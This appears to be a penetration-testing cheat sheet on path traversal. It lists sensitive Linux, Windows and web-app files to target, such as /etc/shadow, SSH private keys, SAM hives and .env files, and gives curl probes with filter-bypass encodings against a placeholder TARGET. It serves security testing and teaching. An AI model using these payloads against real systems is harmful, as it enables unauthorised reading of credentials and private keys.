# Vulnerability - File Inclusion

## Path Traversal
- Also known as Directory traversa
- Allows an attacker to read operating system resources, such as local files on the server running an application.

### Linux — common files to test
- **`/etc/passwd`** — system user accounts (no password hashes on modern systems). **Sensitivity:** Medium.  
- **`/etc/shadow`** — password hashes for users (normally privileged). **Sensitivity:** Critical.  
- **`/etc/issue`** — system banner (fingerprinting). **Sensitivity:** Low.  
- **`/proc/version`** — kernel version (fingerprinting). **Sensitivity:** Low.  
- **`/etc/hosts`** — local hostname mappings. **Sensitivity:** Low.  
- **`/etc/ssh/sshd_config`** — SSH server configuration (may reveal ports/options). **Sensitivity:** High.  
- **`/root/.ssh/id_rsa`** (or `~/.ssh/id_rsa` for users) — private SSH keys. **Sensitivity:** Critical.  
- **`/root/.bash_history`** (or users' histories) — shell history, may contain secrets/commands. **Sensitivity:** High.  
- **`/var/log/auth.log`, `/var/log/secure`** — authentication logs. **Sensitivity:** High.  
- **`/var/log/apache2/access.log`, `/var/log/nginx/access.log`** — web server logs (may contain tokens, session IDs). **Sensitivity:** Medium → High.  
- **`/var/log/messages`, `/var/log/syslog`, `/var/log/dmesg`** — general system logs (useful for enumeration). **Sensitivity:** Medium.  
- **`/etc/cron*`, `/var/spool/cron/crontabs`** — cron jobs (may reveal scripts or credentials). **Sensitivity:** High.  
- **`/etc/mysql/my.cnf`, /etc/postgresql/*/pg_hba.conf** — DB configs (may include credentials or connection info). **Sensitivity:** High.  
- **`/var/www/html/.env`, /var/www/app/.env, */.env`** — application environment variables (often contain DB credentials, API keys). **Sensitivity:** Critical.  
- **Application config files** (e.g., `config.php`, `settings.php`) — may include DB credentials, salts, API keys. **Sensitivity:** High.  
- **`/etc/selinux/config`** — SELinux policy info. **Sensitivity:** Low → Medium.  
- **Backup files** (e.g., `/etc/passwd-`, `config.php~`, `backup.sql`) — may contain sensitive copies. **Sensitivity:** Medium → High.

### Windows — common files to test
- **`C:\boot.ini`** — legacy boot configuration (older Windows versions). **Sensitivity:** Low.  
- **`C:\Windows\win.ini`** — legacy configuration file (fingerprinting). **Sensitivity:** Low.  
- **`C:\Windows\System32\config\SAM`** — local SAM database (contains account hashes; normally protected). **Sensitivity:** Critical.  
- **`C:\Windows\System32\config\SYSTEM`, `... \SOFTWARE`** — registry hives. **Sensitivity:** Critical.  
- **`C:\Users\Administrator\.ssh\id_rsa`** or `C:\Users\<user>\.ssh\id_rsa` — private SSH keys. **Sensitivity:** Critical.  
- **`C:\Users\<user>\AppData\Roaming\*`** — application configs and possible credentials. **Sensitivity:** Medium → High.  
- **Web app configs** (`C:\inetpub\wwwroot\.env`, `web.config`, `appsettings.json`) — may contain connection strings and secrets. **Sensitivity:** Critical / High.  
- **DB/service configs** (`C:\ProgramData\MySQL\my.ini`, `C:\Program Files\*\config.ini`) — service configuration and potential secrets. **Sensitivity:** High.  
- **Windows event logs** (`C:\Windows\System32\winevt\Logs\Application.evtx`, `Security.evtx`) — event data for forensics/enum. **Sensitivity:** Medium → High.  
- **IIS logs** (`C:\inetpub\logs\LogFiles\W3SVC*\u_ex*.log`) — web logs (may include sensitive request data). **Sensitivity:** Medium.  
- **User documents** (`C:\Users\<user>\Documents\*`) — files that may contain secrets. **Sensitivity:** Medium → High.  
- **Scheduled tasks** (`C:\Windows\Tasks`, `C:\Windows\System32\Tasks`) — tasks and referenced scripts (may run with elevated privileges). **Sensitivity:** High.

### Web application & framework files (both OS)
- **`.env`, `config.php`, `wp-config.php`** — environment variables and DB credentials for apps and CMS. **Sensitivity:** Critical.  
- **`config/*.yml`, app config files (e.g., `parameters.yml`)`** — app configuration files for frameworks (Symfony, Rails). **Sensitivity:** High.  
- **`WEB-INF/web.xml`, WEB-INF/classes`** — Java webapp configuration and properties. **Sensitivity:** High.  
- **Uploads and users' files** (`/uploads/*`) — can expose user content or previously uploaded sensitive files. **Sensitivity:** Medium → High.  
- **Backups left in webroot** (`backup.zip`, `dbbackup.sql`, `config.bak`) — commonly exposed sensitive data. **Sensitivity:** High.

### Basic curl probes
```bash
# Direct traversal (Linux)
curl -si "http://TARGET/index.php?lang=../../../../etc/passwd"

# Trailing slash trick (some filters block exact filename)
curl -si "http://TARGET/index.php?lang=/etc/passwd/"

# Null byte (legacy/old targets; often ineffective on modern stacks)
curl -si "http://TARGET/index.php?lang=/etc/passwd%00"

# URL-encoded
curl -si "http://TARGET/index.php?lang=%2Fetc%2Fpasswd"

# Double-encoded
curl -si "http://TARGET/index.php?lang=%252Fetc%252Fpasswd"

# Mixed encodings / dot-variants
curl -si "http://TARGET/index.php?lang=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
curl -si "http://TARGET/index.php?lang=.%2F.%2F.%2F.%2Fetc%2Fpasswd"
```
### Encodings & weird separators

```bash
# Backslash (Windows) encoded
curl -si "http://TARGET/index.php?lang=..%5C..%5C..%5C..%5CWindows%5Cwin.ini"

# Overlong / Unicode variants (may bypass naive filters)
curl -si "http://TARGET/index.php?lang=%C0%AE%C0%AE%2F%C0%AE%C0%AE%2Fetc%2Fpasswd"

# UTF-8 percent-encoding of dots/slashes
curl -si "http://TARGET/index.php?lang=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```